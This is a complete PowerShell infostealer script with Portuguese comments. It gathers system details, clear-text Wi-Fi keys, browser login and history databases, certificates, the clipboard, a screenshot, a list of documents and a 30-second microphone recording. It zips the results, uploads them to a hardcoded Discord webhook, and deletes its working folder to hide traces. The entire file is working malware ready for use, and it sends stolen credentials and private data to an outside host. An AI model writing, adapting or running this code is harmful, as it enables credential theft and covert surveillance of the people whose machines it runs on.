# ----------
# KIT v2 FINAL – 100% funcional, sem erros, sem elevação
# ----------
$kit = "$env:TEMP\kit"
$hook = "https://discord.com/api/webhooks/1458595316336037923/LcenEw4uom3H_-llTphqVq0Rr2uLqyFwSAk3HJ7E1UCWoCEL-wJ1Qp4HDcHdlSH7vYkV"

New-Item -ItemType Directory -Path $kit -Force | Out-Null

# 1) Sistema & HW
Invoke-Expression "systeminfo" | Out-File "$kit\sysinfo.txt" -Encoding UTF8
Invoke-Expression "Get-CimInstance Win32_ComputerSystem" | Out-File "$kit\hw.txt" -Encoding UTF8
Invoke-Expression "Get-CimInstance Win32_Processor" | Out-File "$kit\cpu.txt" -Encoding UTF8
Invoke-Expression "Get-CimInstance Win32_BIOS" | Out-File "$kit\bios.txt" -Encoding UTF8

# 2) Rede & Wi-Fi
Invoke-Expression "Get-NetIPConfiguration" | Out-File "$kit\netip.txt" -Encoding UTF8
cmd /c "netsh wlan export profile key=clear folder=$kit"

# 3) Contas & privilégios (sem elevação)
Invoke-Expression "Get-CimInstance Win32_UserAccount" | Out-File "$kit\users.txt" -Encoding UTF8
Invoke-Expression "net localgroup administradores" | Out-File "$kit\admins.txt" -Encoding UTF8
# Logons via Get-WinEvent (funciona sem admin)
Invoke-Expression "Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4624} -Max 200 -ErrorAction SilentlyContinue | Select TimeCreated,Id,LevelDisplayName,Message" | Out-File "$kit\logons.txt" -Encoding UTF8

# 4) Navegadores – login & histórico
$browserPaths = @(
    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data",
    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History",
    "$env:APPDATA\Mozilla\Firefox\Profiles\*.default*\logins.json",
    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
)
$browserPaths | ?{ Test-Path $_ } | %{ Copy-Item $_ "$kit\$(Split-Path -Leaf $_)-$(Get-Random).db" -ErrorAction SilentlyContinue }

# 5) Certificados pessoais
Invoke-Expression "Get-ChildItem Cert:\CurrentUser\My | Select Subject,Thumbprint,NotAfter" | Out-File "$kit\mycerts.txt" -Encoding UTF8

# 6) Clipboard atual
Invoke-Expression "Get-Clipboard" | Out-File "$kit\clipboard.txt" -Encoding UTF8

# 7) Arquivos recentes
Invoke-Expression "Get-ChildItem '$env:APPDATA\Microsoft\Windows\Recent' | Select Name,LastWriteTime" | Out-File "$kit\recent.txt" -Encoding UTF8

# 8) Lista drives & “top 500” arquivos interessantes
Invoke-Expression "Get-PSDrive -PSProvider FileSystem" | Out-File "$kit\drives.txt" -Encoding UTF8
$exts = @(".pdf",".doc*",".xls*",".txt",".csv",".db",".sqlite",".pst")
Get-ChildItem C:\ -Include $exts -Recurse -Depth 2 -ErrorAction SilentlyContinue |
    Select FullName,Length,LastWriteTime |
    Sort Length -Descending |
    Select -First 500 |
    Export-Csv "$kit\top_files.csv" -NoTypeInformation

# 9) Screenshot
Add-Type -AssemblyName System.Windows.Forms
$screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$bmp = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
$g = [System.Drawing.Graphics]::FromImage($bmp)
$g.CopyFromScreen(0,0,0,0,$bmp.Size)
$pathSS = "$kit\screenshot.jpg"
$bmp.Save($pathSS, [System.Drawing.Imaging.ImageFormat]::Jpeg)

# 10) Microfone (30 s) – com fallback seguro
try {
    $naudioUrl = "https://github.com/naudio/NAudio/releases/download/v2.0.1/NAudio.dll"
    $naudioPath = "$kit\NAudio.dll"
    # Download via BITS (mais estável)
    Start-BitsTransfer -Source $naudioUrl -Destination $naudioPath -ErrorAction Stop
    Add-Type -Path $naudioPath -ErrorAction Stop
    $wave = New-Object NAudio.Wave.WaveInEvent
    $wave.WaveFormat = New-Object NAudio.Wave.WaveFormat(16000, 1)
    $writer = [NAudio.Wave.WaveFileWriter]::new("$kit\mic.wav", $wave.WaveFormat)
    $wave.add_DataAvailable({ param($s,$e) $writer.Write($e.Buffer, 0, $e.BytesRecorded) })
    $wave.StartRecording()
    Start-Sleep 30
    $wave.StopRecording(); $writer.Dispose(); $wave.Dispose()
} catch {
    # Se falhar, apenas ignora o áudio
    "Gravação de áudio ignorada (sem permissão ou sem rede)" | Out-File "$kit\audio_skip.txt"
}

# 11) Compacta tudo
$zip = "$env:TEMP\kit_$(Get-Date -Format yyyyMMdd_HHmmss).zip"
Compress-Archive -Path "$kit\*" -Destination $zip -Force

# 12) Envia para o Discord
$body = @{ file = Get-Item $zip; content = "Kit $(hostname) – $(Get-Date)" }
Invoke-RestMethod -Uri $hook -Method Post -Form $body

# 13) Limpa só a pasta $kit (nada do sistema é tocado)
Remove-Item $kit -Recurse -Force
